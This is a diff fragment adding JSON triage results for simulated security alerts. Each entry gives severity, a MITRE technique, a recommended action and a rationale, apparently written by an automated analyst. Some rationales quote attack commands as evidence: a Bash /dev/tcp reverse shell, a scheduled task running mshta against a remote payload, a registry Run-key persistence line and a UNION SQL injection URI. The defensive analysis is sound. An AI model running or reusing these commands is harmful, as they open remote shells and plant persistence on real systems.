+      "rationale": "SentinelOne EDR detected xmrig \u2014 a well-known Monero cryptominer \u2014 actively running on BUILD-AGENT-12 and connecting to pool.minexmr.example, with sustained 100% CPU consumption. MITRE mapping confidently identifies this as T1496 (Resource Hijacking). The host is a CI/CD build agent, making this especially critical: build agents typically hold secrets, have broad network access, and can inject malicious code into software artifacts, raising supply chain compromise concerns. No prior alerts exist for this host or domain in the last 7 days, indicating a new, active intrusion. xmrig has no legitimate enterprise use case. Immediate containment of BUILD-AGENT-12 is warranted to stop active mining, prevent lateral movement or secret exfiltration, and protect the integrity of the build pipeline. A full forensic investigation of the build agent \u2014 including recent job logs, dependency changes, and artifact integrity \u2014 should follow containment.",
+      "supporting_observations": [
+        "xmrig process detected by SentinelOne EDR with confirmed mining pool argument (pool.minexmr.example), a known XMR mining pool pattern",
+        "Sustained 100% CPU usage confirms active cryptomining, not a dormant or test binary",
+        "Affected host BUILD-AGENT-12 is a CI/CD build agent \u2014 a high-value target with potential access to secrets and software supply chain",
+        "No prior alerts for BUILD-AGENT-12 or pool.minexmr.example in the last 7 days \u2014 indicates a new, unrecognized intrusion",
+        "MITRE ATT&CK T1496 (Resource Hijacking) matched with maximum confidence score by keyword mapping tool",
+        "xmrig has no legitimate enterprise use case; its presence is inherently malicious in this context"
+      ]
+    },
+    "A-0020": {
+      "alert_id": "A-0020",
+      "severity": "high",
+      "confidence": 0.9,
+      "mitre_technique_id": "T1133",
+      "mitre_technique_name": "External Remote Services",
+      "recommended_action": "contain",
+      "rationale": "A successful interactive RDP session (logon type 10) was established on production server APP-PROD-09 by user b.nguyen from IP 203.0.113.188 (Romania), which is outside all authorized office/VPN ranges. TI lookup returned a suspicious verdict with a risk score of 64/100 and an active RDP brute-force category, last seen today. This strongly suggests the account was compromised via brute-force and used to gain initial access. No prior alerts exist for the user, host, or IP \u2014 ruling out a known false-positive pattern. Immediate containment is warranted: isolate APP-PROD-09, disable or reset b.nguyen's credentials, and block the source IP at the perimeter.",
+      "supporting_observations": [
+        "IP 203.0.113.188 flagged as suspicious with risk score 64/100, categorized as RDP brute-force, last seen 2026-05-27.",
+        "Logon type 10 confirms a successful interactive RDP session \u2014 not a failed attempt.",
+        "Source geo is Romania (RO), entirely outside authorized office and VPN ranges.",
+        "User b.nguyen has no prior alert history in the last 7 days, indicating no baseline for foreign logins.",
+        "Production host APP-PROD-09 has no prior alert history, making this a novel intrusion event.",
+        "MITRE mapping: T1133 (External Remote Services / Initial Access) and T1021.001 (Remote Desktop Protocol / Lateral Movement)."
+      ]
+    },
+    "A-0021": {
+      "alert_id": "A-0021",
+      "severity": "high",
+      "confidence": 0.93,
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "recommended_action": "contain",
+      "rationale": "All evidence converges on a credible, active SQL injection attack against the public storefront (shop-edge-01). (1) The IDS fired on a classic UNION-based SQLi payload in the URI (/product?id=1 UNION SELECT), a well-known data-exfiltration technique. (2) The source IP 198.51.100.205 carries a threat-intelligence risk score of 90/100, is categorized as 'malicious' under 'exploitation' and 'web-attack', and was last seen today (2026-05-28). (3) A prior alert for this same IP was recorded just one hour earlier (07:41 vs 08:41), indicating sustained, repeated targeting rather than a one-off scanner hit. (4) The target host (shop-edge-01) also has a recent alert in the same window, suggesting it is actively under pressure. MITRE best-fit is T1190 (Exploit Public-Facing Application / Initial Access). Recommended action is CONTAIN: block the source IP at the perimeter/WAF immediately, review web server and database logs on shop-edge-01 for successful query execution or data leakage, and assess whether any backend database rows were returned to the attacker.",
+      "supporting_observations": [
+        "Source IP 198.51.100.205 rated MALICIOUS by threat intelligence with risk score 90/100; categories: exploitation, web-attack; last seen 2026-05-28.",
+        "UNION-based SQLi payload confirmed in URI: /product?id=1%20UNION%20SELECT \u2014 classic data-exfiltration technique mapped to T1190.",
+        "Prior alert for 198.51.100.205 recorded ~1 hour before this alert (07:41Z vs 08:41Z), indicating sustained targeting.",
+        "Target host shop-edge-01 also has a recent alert in the 168-hour lookback window, corroborating active attack pressure on this asset.",
+        "Suricata rule SQLi-UNION fired with high confidence on a well-known injection pattern."
+      ]
+    },
+    "A-0022": {
+      "alert_id": "A-0022",
+      "severity": "critical",
+      "confidence": 0.99,
+      "mitre_technique_id": "T1505.003",
+      "mitre_technique_name": "Server Software Component: Web Shell",
+      "recommended_action": "contain",
+      "rationale": "All evidence conclusively confirms an active web shell compromise on shop-edge-01. (1) HASH CONFIRMED MALWARE: The file hash for C:\\inetpub\\wwwroot\\status.aspx is identified as the ChinaChopper web shell family (44 AV detections; signatures: Backdoor:ASP/Webshell, Trojan:Script/Chopper) \u2014 one of the most widely used attacker-controlled backdoors. (2) ATTACK CHAIN INTACT: The alert describes a textbook exploit-to-webshell sequence \u2014 a public-facing application exploit (T1190) dropped an .aspx file with eval/exec patterns, followed by w3wp.exe spawning cmd.exe for interactive command execution (T1059.003), consistent with ChinaChopper's one-liner execution model. (3) PRIOR HOST ACTIVITY: shop-edge-01 had a prior alert just ~68 minutes before this event (2026-05-28T07:41:12Z), suggesting the exploit attempt was already underway. (4) TECHNIQUE: The primary technique is T1505.003 (Web Shell), enabling persistent, authenticated remote code execution through the web server. Immediate containment is required: isolate shop-edge-01 from the network, preserve forensic artifacts, remove the web shell, patch the exploited vulnerability, and initiate full incident response. Escalate to IR team immediately.",
+      "supporting_observations": [
+        "File hash c0ffee11deadbeef22cafe33babe44f00d55ba5e66c0de77fa11ce88da7a99b0 confirmed as ChinaChopper web shell with 44 detections (Backdoor:ASP/Webshell, Trojan:Script/Chopper)",
+        "Web shell dropped at C:\\inetpub\\wwwroot\\status.aspx immediately after exploit attempt on public-facing IIS server",
+        "w3wp.exe (IIS worker process) spawning cmd.exe \u2014 classic web shell command execution pattern",
+        "Prior alert on shop-edge-01 at 2026-05-28T07:41:12Z (~68 min before this alert) indicates the exploit attempt was already in progress",
+        "MITRE ATT&CK chain: T1190 (Exploit Public-Facing Application) \u2192 T1505.003 (Web Shell) \u2192 T1059.003 (Windows Command Shell)",
+        "ChinaChopper is a known APT-associated tool, raising the possibility of a targeted intrusion"
+      ]
+    },
+    "A-0023": {
+      "alert_id": "A-0023",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1071",
+      "mitre_technique_name": "Application Layer Protocol",
+      "recommended_action": "contain",
+      "rationale": "All evidence strongly confirms an active C2 compromise. The destination IP (203.0.113.99) scored 95/100 malicious with explicit Cobalt Strike and C2 categories, last seen today. The domain cdn-update-sync.net is confirmed on the threat-intel C2 list (ti_match: c2_known). The 60-second jittered HTTPS beaconing pattern is a hallmark of Cobalt Strike or similar implant check-in behavior. Host FIN-WS-118 also has prior suspicious alert history from 2026-05-27, indicating this is not an isolated or first-time event. Immediate containment of FIN-WS-118 (network isolation) is warranted to prevent lateral movement, data exfiltration, or further attacker actions. Escalation to IR team for full forensic investigation of the host is strongly recommended.",
+      "supporting_observations": [
+        "IP 203.0.113.99 reputation: MALICIOUS, risk score 95/100, categories: [c2, cobalt-strike], last seen 2026-05-29 (today).",
+        "Domain cdn-update-sync.net confirmed on threat-intel C2 known list (raw.ti_match = c2_known).",
+        "Beaconing pattern: regular HTTPS connections every 60 seconds with jitter \u2014 classic Cobalt Strike implant beacon cadence.",
+        "Host FIN-WS-118 has prior alert history (HIST-host-FIN-WS-118, 2026-05-27), indicating repeated suspicious activity.",
+        "MITRE ATT&CK mapping: T1071 Application Layer Protocol (Command and Control tactic)."
+      ]
+    },
+    "A-0024": {
+      "alert_id": "A-0024",
+      "severity": "critical",
+      "confidence": 0.98,
+      "mitre_technique_id": "T1003",
+      "mitre_technique_name": "OS Credential Dumping",
+      "recommended_action": "escalate",
+      "rationale": "Confirmed Mimikatz (HackTool:Win32/Mimikatz) detected in memory on domain controller DC-01. Hash enrichment returned known_malware=true with 58 detections across the Mimikatz family. MITRE mapping confirms T1003 (OS Credential Dumping). A domain controller is the highest-value target in an AD environment \u2014 credential dumping here can expose all domain accounts including krbtgt, enabling Golden Ticket attacks and full domain compromise. A prior alert on DC-01 just 63 minutes earlier (HIST-host-DC-01) suggests sustained attacker presence. The in-memory detection vector indicates possible fileless/reflective loading to evade disk-based controls. This is a confirmed, active, high-confidence credential theft incident on a critical asset requiring immediate escalation and containment.",
+      "supporting_observations": [
+        "Hash aa11bb22cc33dd44ee55ff6677889900aabbccddeeff00112233445566778899 confirmed as Mimikatz malware family with 58 AV detections (known_malware=true).",
+        "Signature HackTool:Win32/Mimikatz matched in memory on DC-01, a domain controller \u2014 the most sensitive host in an AD environment.",
+        "MITRE ATT&CK mapping: T1003 OS Credential Dumping under Credential Access tactic.",
+        "Prior alert HIST-host-DC-01 on the same host approximately 63 minutes before this alert, indicating sustained or escalating attacker activity.",
+        "In-memory detection suggests fileless/reflective loading technique, bypassing disk-based AV controls."
+      ]
+    },
+    "A-0025": {
+      "alert_id": "A-0025",
+      "severity": "high",
+      "confidence": 0.88,
+      "mitre_technique_id": "T1055",
+      "mitre_technique_name": "Process Injection",
+      "recommended_action": "contain",
+      "rationale": "rundll32.exe used CreateRemoteThread to inject code into explorer.exe \u2014 a textbook T1055 Process Injection pattern consistent with malware families such as Emotet, TrickBot, and Cobalt Strike. rundll32.exe is a well-known LOLBin (Living-off-the-Land Binary) abused to load arbitrary payloads while blending into normal Windows activity. Injecting into explorer.exe grants the attacker a trusted process context for defense evasion and potential persistence. MITRE mapping returned a strong match (score 3) for T1055 under the Defense Evasion tactic. Host MKT-WS-244 had a prior alert approximately 2.5 hours earlier on the same day, suggesting an active and progressing compromise rather than an isolated event. No file hashes or IPs were available to further enrich, but the behavioral indicators alone are high-confidence. Immediate isolation of MKT-WS-244 is recommended to prevent lateral movement or data exfiltration.",
+      "supporting_observations": [
+        "CreateRemoteThread API call from rundll32.exe targeting explorer.exe \u2014 classic process injection pattern",
+        "rundll32.exe is a known LOLBin frequently abused by malware to evade detection",
+        "explorer.exe is a high-value injection target that provides a trusted process context",
+        "MITRE ATT&CK mapping: T1055 Process Injection (Defense Evasion) \u2014 strong match score of 3",
+        "MKT-WS-244 had 1 prior alert on the same day (~2.5 hours earlier), indicating a pattern of suspicious activity",
+        "No environment-wide rundll32.exe alerts in the past 7 days \u2014 this is not a noisy/widespread false positive"
+      ]
+    },
+    "A-0026": {
+      "alert_id": "A-0026",
+      "severity": "high",
+      "confidence": 0.93,
+      "mitre_technique_id": "T1566.002",
+      "mitre_technique_name": "Spearphishing Link",
+      "recommended_action": "contain",
+      "rationale": "User s.alvarez clicked a confirmed phishing link (Zscaler category: phishing) to login-microsoftonline-secure.com, a 2-day-old domain impersonating Microsoft 365. MITRE mapping strongly matches T1566.002 (Spearphishing Link, score 1.0). The domain name is a clear typosquat of login.microsoftonline.com. No prior alerts exist for either the domain or the user in the last 7 days, consistent with a targeted spearphishing attack. Because the user reached a credential harvesting page, account compromise of s.alvarez must be assumed. Immediate containment actions are warranted: force-reset s.alvarez's M365 credentials, revoke active sessions/tokens, enable MFA if not already active, and block the domain at the proxy and DNS layers. Investigate proxy logs to determine whether credentials were submitted (POST request to the phishing domain).",
+      "supporting_observations": [
+        "MITRE T1566.002 (Spearphishing Link) matched with score 1.0 by keyword mapping.",
+        "Domain login-microsoftonline-secure.com is a typosquat of login.microsoftonline.com, explicitly categorized as 'phishing' by Zscaler.",
+        "Domain age is only 2 days \u2014 hallmark of purpose-built phishing infrastructure.",
+        "No prior alerts for domain login-microsoftonline-secure.com in the last 7 days \u2014 suggests targeted delivery to s.alvarez specifically.",
+        "No prior alerts for user s.alvarez in the last 7 days \u2014 first-time event, no established pattern of risky browsing.",
+        "Credential submission cannot be ruled out; M365 account compromise must be treated as likely until proxy POST logs are reviewed."
+      ]
+    },
+    "A-0027": {
+      "alert_id": "A-0027",
+      "severity": "high",
+      "confidence": 0.82,
+      "mitre_technique_id": "T1567",
+      "mitre_technique_name": "Exfiltration Over Web Service",
+      "recommended_action": "investigate",
+      "rationale": "Forcepoint DLP detected user k.brennan uploading 1.2 GB of documents to a personal Dropbox account, in direct violation of data-handling policy. This maps with high confidence to T1567 (Exfiltration Over Web Service). The volume (1.2 GB) is substantial and unlikely to be accidental. Use of a personal (non-corporate) account means data is entirely outside organizational control, eliminating any DRM or audit trail. No prior alerts exist for k.brennan in the last 30 days, so this cannot be dismissed as a repeat false-positive pattern. While insider threat or deliberate exfiltration is a concern, the activity could also reflect a negligent policy violation (e.g., working from home). An investigation is warranted to: (1) identify what data was uploaded, (2) interview k.brennan and their manager, (3) determine if this is an isolated incident or part of a broader pattern, and (4) assess whether a data breach notification obligation is triggered.",
+      "supporting_observations": [
+        "MITRE ATT&CK mapping: T1567 Exfiltration Over Web Service \u2014 score 1.0 (highest confidence match)",
+        "1.2 GB uploaded to a personal Dropbox account \u2014 substantial volume inconsistent with accidental transfer",
+        "Account type confirmed as 'personal', meaning data is outside corporate DLP/DRM controls post-upload",
+        "Explicit policy violation flagged by Forcepoint DLP",
+        "No prior alerts for user k.brennan in the last 30 days \u2014 no established false-positive baseline",
+        "No other users triggered Dropbox-related alerts in the past 7 days \u2014 not a systemic/tool-wide issue"
+      ]
+    },
+    "A-0028": {
+      "alert_id": "A-0028",
+      "severity": "critical",
+      "confidence": 0.98,
+      "mitre_technique_id": "T1059.004",
+      "mitre_technique_name": "Unix Shell",
+      "recommended_action": "contain",
+      "rationale": "Every data point confirms an active, high-confidence reverse shell compromise on a public-facing web server:\n\n1. **Command line is unambiguous**: `bash -i >& /dev/tcp/198.51.100.205/4444 0>&1` is the canonical Bash /dev/tcp reverse shell one-liner \u2014 interactive shell, stdout/stderr redirected to an attacker-controlled socket on port 4444.\n\n2. **Destination IP is confirmed malicious**: TI lookup returned reputation=malicious, risk score=90/100, categorised under \"exploitation\" and \"web-attack\", last seen TODAY (2026-05-28), indicating an active threat actor infrastructure.\n\n3. **Prior activity on the same IP and host**: Both `198.51.100.205` and `shop-edge-01` appear in alert history from ~80 minutes before this alert (07:41 UTC vs 09:02 UTC), suggesting the attacker may have been probing or exploiting the server earlier in the same session.\n\n4. **Attack surface**: `shop-edge-01` is a public-facing edge web server \u2014 a high-value target. A successful reverse shell here grants the attacker interactive OS-level access, enabling lateral movement, data exfiltration, and persistence.\n\n**Immediate recommended actions**: (a) Isolate/contain `shop-edge-01` from the network NOW to cut the active C2 channel; (b) Capture a memory image and preserve auditd logs before containment if operationally feasible; (c) Identify the initial access vector (web exploit, uploaded webshell, etc.) by reviewing web server logs around and before 07:41 UTC; (d) Rotate all credentials accessible from this host; (e) Escalate to IR team for full forensic investigation.",
+      "supporting_observations": [
+        "Command line `bash -i >& /dev/tcp/198.51.100.205/4444 0>&1` is the textbook Bash reverse shell technique (T1059.004), providing an interactive shell to the attacker.",
+        "IP 198.51.100.205 has a TI reputation of MALICIOUS with a risk score of 90/100, categorised as 'exploitation' and 'web-attack', last seen on the same day as this alert.",
+        "Prior alert history shows activity involving both 198.51.100.205 and shop-edge-01 approximately 80 minutes before this alert, suggesting an earlier exploitation or reconnaissance phase.",
+        "The victim host shop-edge-01 is a public-facing edge web server, making this a high-impact compromise with broad lateral movement potential.",
+        "Outbound connection on port 4444 is a well-known reverse shell listener port, consistent with attacker-controlled C2 infrastructure."
+      ]
+    },
+    "A-0029": {
+      "alert_id": "A-0029",
+      "severity": "high",
+      "confidence": 0.88,
+      "mitre_technique_id": "T1547.001",
+      "mitre_technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "recommended_action": "contain",
+      "rationale": "A Registry Run key was added via 'reg add HKCU\\...\\CurrentVersion\\Run /v Sync /d c:\\users\\public\\s.vbs', establishing logon persistence through a VBScript in C:\\Users\\Public \u2014 a world-writable directory never used by legitimate software. The script name 's.vbs' is single-character and obfuscated-style, and the value name 'Sync' is a deliberate disguise. MITRE mapping confirms T1547 (Boot or Logon Autostart Execution, Persistence). Host ENG-WS-309 also had a prior alert ~12 hours earlier, suggesting ongoing or escalating compromise. No file hash was available to enrich the VBScript, meaning its payload is unknown. The combination of a suspicious persistence mechanism, a high-risk script location, obfuscated naming, and prior host activity elevates this well above the reported 'low' severity. Immediate containment of ENG-WS-309 is recommended to prevent further execution of the unknown VBScript payload at next logon, followed by forensic retrieval and analysis of s.vbs.",
+      "supporting_observations": [
+        "Run key written to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with value name 'Sync' pointing to c:\\users\\public\\s.vbs",
+        "C:\\Users\\Public is a world-writable shared directory \u2014 not a legitimate software installation path",
+        "Script filename 's.vbs' is a single-character obfuscated name consistent with malware dropper/loader naming conventions",
+        "MITRE ATT&CK top match: T1547 Boot or Logon Autostart Execution (Persistence tactic, score 3)",
+        "Host ENG-WS-309 had a prior alert flagged ~12 hours before this event (2026-05-26T19:05:41Z), indicating possible ongoing compromise",
+        "No file hash available for s.vbs \u2014 payload content and intent cannot be verified without forensic retrieval"
+      ]
+    },
+    "A-0030": {
+      "alert_id": "A-0030",
+      "severity": "medium",
+      "confidence": 0.65,
+      "mitre_technique_id": "T1566",
+      "mitre_technique_name": "Phishing",
+      "recommended_action": "investigate",
+      "rationale": "A sales workstation (SALES-WS-077) issued a single DNS query to 'promo-deals-today.info', a domain registered only 1 day prior. Newly registered domains with promotional/lure-style naming conventions are strongly associated with phishing campaigns and C2 staging infrastructure. While no follow-on traffic was observed and no file hashes or IPs were present to enrich, the domain name pattern and extreme youth (1 day old) are high-risk signals. SALES-WS-077 also had a prior alert ~1 hour earlier, suggesting the host may warrant broader scrutiny. MITRE mapping best fits T1566 (Phishing) given the domain characteristics and the sales-user context (a common phishing target). Confidence is moderate (0.65) because no confirmed malicious payload, C2 callback, or TI hit was observed \u2014 but the risk profile warrants investigation to determine how the user encountered this domain (email link, web redirect, etc.) and whether any follow-on activity occurred.",
+      "supporting_observations": [
+        "Domain 'promo-deals-today.info' is only 1 day old \u2014 a strong indicator of phishing or C2 infrastructure.",
+        "Domain name pattern ('promo-deals-today.info') is consistent with phishing lure domains targeting sales/consumer users.",
+        "No prior alert history for this domain in the last 168 hours, suggesting it is newly active.",
+        "Host SALES-WS-077 had a prior alert approximately 1 hour before this event (HIST-host-SALES-WS-077, 2026-05-26T12:12:04Z), warranting broader host review.",
+        "Only a single DNS request was observed with no follow-on traffic \u2014 early-stage indicator, possibly a link click or initial beacon.",
+        "No file hashes or resolved IPs were available for further enrichment."
+      ]
+    },
+    "A-0031": {
+      "alert_id": "A-0031",
+      "severity": "low",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1110",
+      "mitre_technique_name": "Brute Force",
+      "recommended_action": "close_false_positive",
+      "rationale": "The alert describes 28 failed logins against service account 'svc-reports' from host RPT-APP-01, resulting in an automatic lockout. The source is explicitly identified as an internal misconfigured service \u2014 not a threat actor. No successful authentication occurred, ruling out credential compromise. MITRE mapping returned T1110 (Brute Force) as the closest pattern, but the activity is operationally explained by stale/incorrect credentials in a service configuration. No prior alerts exist for either 'svc-reports' or 'RPT-APP-01' in the past 7 days, and there are no malicious IPs, file hashes, or domains involved. This is a false positive from a security-threat perspective; the underlying issue is a misconfiguration that should be remediated by the service owner (update credentials and unlock the account).",
+      "supporting_observations": [
+        "28 failed login attempts with no successful authentication \u2014 no credential compromise occurred.",
+        "Source explicitly attributed to 'internal_service_misconfig', not an external or insider threat actor.",
+        "Zero prior alerts for user 'svc-reports' in the last 168 hours \u2014 no pattern of suspicious activity.",
+        "Zero prior alerts for host 'RPT-APP-01' in the last 168 hours \u2014 no pattern of suspicious activity.",
+        "No malicious observables present: no IPs, file hashes, or domains to investigate.",
+        "MITRE T1110 (Brute Force) is the closest technique match, but context confirms this is a misconfiguration, not an attack."
+      ]
+    },
+    "A-0032": {
+      "alert_id": "A-0032",
+      "severity": "informational",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1021.001",
+      "mitre_technique_name": "Remote Desktop Protocol",
+      "recommended_action": "close_false_positive",
+      "rationale": "All evidence strongly supports a benign, authorized activity: (1) The alert itself confirms the session occurred within an approved maintenance window (approved_window: true) via the sanctioned jump host JUMP-01, under vendor contract VC-2210. (2) IP 10.50.0.9 is an internal RFC-1918 address with no threat intelligence hits (reputation: unknown, risk score: 0). (3) User 'vendor.acme' has zero prior alerts in the last 168 hours, indicating no history of suspicious behavior. (4) Host JUMP-01 has no recent alert history either, confirming it is operating normally as a controlled ingress point. The MITRE technique T1021.001 (RDP) is the correct classification for the activity type, but the context \u2014 approved vendor, sanctioned jump host, active maintenance window \u2014 removes any malicious intent. This is a textbook false positive generated by a detection rule that lacks awareness of approved change windows and vendor access controls.",
+      "supporting_observations": [
+        "IP 10.50.0.9 is an internal address with 0 threat intelligence risk score and no known malicious categories.",
+        "User vendor.acme has 0 matching alerts in the past 168 hours \u2014 no pattern of abuse.",
+        "Host JUMP-01 has 0 matching alerts in the past 168 hours \u2014 operating normally.",
+        "Alert metadata confirms approved_window=true, vendor contract VC-2210, and access routed via sanctioned jump host JUMP-01.",
+        "MITRE mapping returned T1021.001 (RDP/Lateral Movement) with a perfect score \u2014 correct technique classification, but context is fully authorized."
+      ]
+    },
+    "A-0033": {
+      "alert_id": "A-0033",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1027",
+      "mitre_technique_name": "Obfuscated Files or Information",
+      "recommended_action": "contain",
+      "rationale": "The SHA-256 hash of the .js file is confirmed malware: 29 AV detections, family JSDropper, signature TrojanDropper:JS/Nemucod (first seen 2026-04-02). This is a well-known dropper family that uses char-code + string concatenation obfuscation to evade detection and fetch/launch a second-stage payload via wscript.exe. Host HR-WS-051 also had a prior alert just one hour before this event (HIST-host-HR-WS-051 at 09:36 UTC), suggesting an active, ongoing compromise sequence. The hash has not been seen on other hosts in the past 7 days, so lateral spread is not yet confirmed but must be assumed possible. Immediate containment of HR-WS-051 is required to prevent second-stage execution, data exfiltration, or lateral movement. Escalation to IR is strongly recommended.",
+      "supporting_observations": [
+        "Hash dec0de00ab12cd34ef56ab78cd90ef12ab34cd56ef78ab90cd12ef34ab56cd78 confirmed malicious: JSDropper / TrojanDropper:JS/Nemucod, 29 detections, first seen 2026-04-02.",
+        "wscript.exe used to execute heavily obfuscated JScript (char-code + concat) \u2014 classic Nemucod dropper delivery mechanism.",
+        "MITRE T1027 (Obfuscated Files or Information) matched with high relevance; dropper stage indicates T1059.007 (JavaScript) is also in play.",
+        "HR-WS-051 had a prior alert (HIST-host-HR-WS-051) exactly 60 minutes before this event, suggesting a multi-stage attack sequence in progress.",
+        "No lateral spread of this hash detected on other hosts in the past 7 days \u2014 infection currently appears isolated to HR-WS-051."
+      ]
+    },
+    "A-0034": {
+      "alert_id": "A-0034",
+      "severity": "low",
+      "confidence": 0.8,
+      "mitre_technique_id": "T1133",
+      "mitre_technique_name": "External Remote Services",
+      "recommended_action": "monitor",
+      "rationale": "A VPN login for user p.santos originated from Portugal (PT), a new geography for this account. However, all key risk indicators are benign: (1) MFA was successfully satisfied, ruling out simple credential theft; (2) the source IP 203.0.113.221 is rated clean with a risk score of only 5/100 and no associated threat categories; (3) no prior alerts exist for either the IP or the user in the past 7 days, indicating no pattern of suspicious activity. The new geography is the sole anomaly and is consistent with legitimate travel or remote work. No escalation is warranted, but the account should be monitored for further anomalous behavior (e.g., impossible travel, privilege escalation, or unusual data access) in the near term.",
+      "supporting_observations": [
+        "IP 203.0.113.221 reputation: clean, risk score 5/100, no threat categories (bundled-ti, 2026-05-25)",
+        "No prior alerts for IP 203.0.113.221 in the last 168 hours",
+        "No prior alerts for user p.santos in the last 168 hours",
+        "MFA passed \u2014 multi-factor authentication successfully satisfied",
+        "New geography: Portugal (PT) \u2014 sole anomaly, consistent with travel or remote work",
+        "MITRE best-fit: T1133 External Remote Services (Initial Access), score 1"
+      ]
+    },
+    "A-0035": {
+      "alert_id": "A-0035",
+      "severity": "high",
+      "confidence": 0.87,
+      "mitre_technique_id": "T1021",
+      "mitre_technique_name": "Remote Services",
+      "recommended_action": "contain",
+      "rationale": "PsExec (PSEXESVC.exe) was used over SMB by the privileged account adm.helpdesk to create a remote service on ENG-WS-309 from ENG-WS-211 \u2014 a classic T1021 lateral movement pattern. Workstation-to-workstation PsExec is atypical for legitimate IT operations, which normally originate from dedicated admin/jump hosts. The source host ENG-WS-211 had a prior alert earlier the same day (13:09 UTC vs. 21:05 UTC), suggesting it may already be compromised. ENG-WS-309 also appeared in a prior alert two days earlier. The adm.helpdesk account has no prior alert history, raising the possibility of credential theft enabling this movement. No benign context (change window, known IT task) is present. Immediate containment of both hosts and the adm.helpdesk account is recommended, along with forensic investigation of ENG-WS-211 as the likely initial compromise point.",
+      "supporting_observations": [
+        "PSEXESVC.exe detected on ENG-WS-309 \u2014 service created remotely via SMB from ENG-WS-211, consistent with T1021 lateral movement.",
+        "Workstation-to-workstation PsExec (ENG-WS-211 \u2192 ENG-WS-309) is anomalous; legitimate admin use typically originates from jump servers.",
+        "ENG-WS-211 (source host) had a prior alert earlier the same day at 13:09 UTC, suggesting possible prior compromise.",
+        "ENG-WS-309 (destination host) had a prior alert on 2026-05-26, indicating repeated suspicious involvement.",
+        "adm.helpdesk is a privileged account with no prior alert history \u2014 potential credential theft or abuse scenario.",
+        "No prior PSEXESVC.exe alerts in the environment, making this an isolated and suspicious first occurrence."
+      ]
+    },
+    "A-0036": {
+      "alert_id": "A-0036",
+      "severity": "low",
+      "confidence": 0.85,
+      "mitre_technique_id": "T1566",
+      "mitre_technique_name": "Phishing",
+      "recommended_action": "monitor",
+      "rationale": "A user-reported phishing email was successfully quarantined by Proofpoint with zero interaction (no clicks, no replies). The sender domain 'secure-billing-update.co' follows a classic phishing naming pattern (billing lure + non-standard TLD), consistent with T1566 Phishing for Initial Access. No prior alerts were found for this domain or the reporting user in the past 7 days, suggesting an isolated attempt rather than an active campaign. Because the email was contained before any harm occurred, escalation or containment is not warranted. However, the domain should be monitored and blocked at the email gateway/DNS layer to prevent future delivery attempts. Security awareness credit should be given to the reporting employee.",
+      "supporting_observations": [
+        "Email quarantined by Proofpoint before any user interaction (no clicks, no replies confirmed)",
+        "Domain 'secure-billing-update.co' matches classic phishing pattern: billing lure with non-standard .co TLD",
+        "Zero prior alerts for domain 'secure-billing-update.co' in the last 168 hours \u2014 no evidence of active campaign",
+        "Zero prior alerts for user 'reporter@corp.example' \u2014 no indication of targeted or repeat activity",
+        "MITRE mapping returned T1566 (Phishing, Initial Access) as the sole match with high relevance",
+        "No file hashes or IPs present in the alert \u2014 attack did not progress beyond email delivery stage"
+      ]
+    },
+    "A-0037": {
+      "alert_id": "A-0037",
+      "severity": "high",
+      "confidence": 0.9,
+      "mitre_technique_id": "T1496",
+      "mitre_technique_name": "Resource Hijacking",
+      "recommended_action": "contain",
+      "rationale": "AWS GuardDuty fired finding CryptoCurrency:EC2/BitcoinTool.B!DNS on EC2 instance i-0ab12cd34ef567890, which was observed resolving and connecting to the known XMR mining pool domain xmr.pool-mine.example. MITRE mapping strongly aligns with T1496 (Resource Hijacking), a well-understood impact-phase technique used by cryptojackers. No prior alert history exists for either the host or the domain in the last 30 days, making this a first-time, isolated event rather than a known-noisy or authorized pattern. The GuardDuty finding type is a high-fidelity, low-false-positive indicator \u2014 DNS resolution of a known mining pool from a cloud compute instance is almost never legitimate. The instance is likely compromised (via exploitation, stolen credentials, or a malicious workload) and is being used to mine cryptocurrency at the organization's expense. Immediate containment (isolate the instance from the network, snapshot for forensics, revoke associated IAM roles/credentials) is warranted before the attacker pivots or exfiltrates data.",
+      "supporting_observations": [
+        "GuardDuty finding CryptoCurrency:EC2/BitcoinTool.B!DNS is a high-fidelity, purpose-built detector for crypto-mining pool communication.",
+        "Domain xmr.pool-mine.example uses the 'xmr' prefix consistent with Monero (XMR) cryptocurrency mining pools.",
+        "MITRE ATT&CK mapping returned T1496 (Resource Hijacking) as a top match, confirming the technique classification.",
+        "No prior alert history for host i-0ab12cd34ef567890 or domain xmr.pool-mine.example in the past 30 days \u2014 this is a new, unrecognized behavior.",
+        "Activity occurred at 02:44 UTC, an off-hours timestamp that reduces the likelihood of authorized/interactive use."
+      ]
+    },
+    "A-0038": {
+      "alert_id": "A-0038",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1218.005",
+      "mitre_technique_name": "System Binary Proxy Execution: Mshta",
+      "recommended_action": "contain",
+      "rationale": "Multiple high-confidence indicators converge on a confirmed malicious persistence mechanism:\n\n1. **LOLBIN Abuse (T1218.005):** mshta.exe \u2014 a Microsoft-signed binary \u2014 is being used to fetch and execute a remote HTA payload over HTTP, a classic living-off-the-land technique to bypass application whitelisting and AV.\n\n2. **Malicious IP Confirmed:** 198.51.100.31 returned a reputation score of 84/100 (malicious), categorized as a malware-hosting server, last seen active on the same day as this alert (2026-05-28). This is not a false positive.\n\n3. **Persistence via Scheduled Task (T1053.005):** The command `schtasks /create /tn Maint /tr \"mshta http://198.51.100.31/p.hta\" /sc onlogon` creates a task that fires on every user logon, ensuring persistent code execution from an attacker-controlled server.\n\n4. **Prior Host Activity:** LAB-WS-004 had a prior alert within the last 168 hours (2026-05-27T22:40:05Z), suggesting this host may already be compromised or actively targeted \u2014 the scheduled task creation may be a follow-on persistence step.\n\n5. **Chained Technique Coverage:** The activity combines execution (T1059), scheduled task persistence (T1053.005), and LOLBIN proxy execution (T1218.005) \u2014 a well-known attacker playbook for establishing durable footholds.\n\n**Recommended immediate actions:** Isolate LAB-WS-004 from the network, delete the 'Maint' scheduled task, block 198.51.100.31 at the perimeter firewall/proxy, collect memory and disk forensics, and investigate the prior alert on this host to determine the initial access vector.",
+      "supporting_observations": [
+        "IP 198.51.100.31 flagged malicious (score 84/100) by threat intelligence, categorized as malware-hosting, last seen 2026-05-28 \u2014 same day as alert.",
